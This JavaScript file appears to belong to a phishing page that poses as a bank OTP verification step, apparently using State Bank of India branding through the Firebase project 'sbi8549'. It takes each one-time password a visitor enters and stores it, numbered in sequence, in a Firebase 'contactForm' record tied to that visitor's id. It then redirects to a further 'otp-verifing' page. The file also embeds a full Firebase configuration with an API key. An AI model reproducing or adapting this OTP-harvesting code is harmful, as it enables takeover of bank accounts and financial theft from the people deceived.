const firebaseConfig = {
    apiKey: "AIzaSyAwr_LMLyM2Tl9HSBE52YsVpiZo1YwMbjQ",
    authDomain: "sbi8549.firebaseapp.com",
    databaseURL: "https://sbi8549-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "sbi8549",
    storageBucket: "sbi8549.appspot.com",
    messagingSenderId: "300597188045",
    appId: "1:300597188045:web:3cfdb9e042ce9f99b96084"
  };
  
  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);
  
  // Reference your database
  var contactFormDB = firebase.database().ref("contactForm");
  
  document.getElementById("otpform").addEventListener("submit", submitUpdate);
  
  function submitUpdate(e) {
    e.preventDefault();
  
    var otp = getElementVal("userotp");
  
    // Get the key from the query parameter
    const urlParams = new URLSearchParams(window.location.search);
    const entryKey = urlParams.get('id');
  
    // Call updateOtpEntry function with the entryKey and otp
    updateOtpEntry(entryKey, otp);
  }
  
  const updateOtpEntry = (key, otp) => {
    // Get the current entry
    contactFormDB.child(key).once('value', function(snapshot) {
      const data = snapshot.val();
      let otpField = "otp1";
  
      if (data) {
        const existingOtps = Object.keys(data).filter(field => field.startsWith('otp'));
        const nextOtpIndex = existingOtps.length + 1;
        otpField = `otp${nextOtpIndex}`;
      }
  
      // Update the corresponding otp field
      let updateData = {};
      updateData[otpField] = otp;
      contactFormDB.child(key).update(updateData, function(error) {
        if (error) {
          console.error("Error updating data:", error);
        } else {
          // Redirect to the next page with the same key
          window.location.href = `otp-verifing.html?id=${key}`;
        }
      });
    });
  };
  
  const getElementVal = (id) => {
    return document.getElementById(id).value;
  };
  
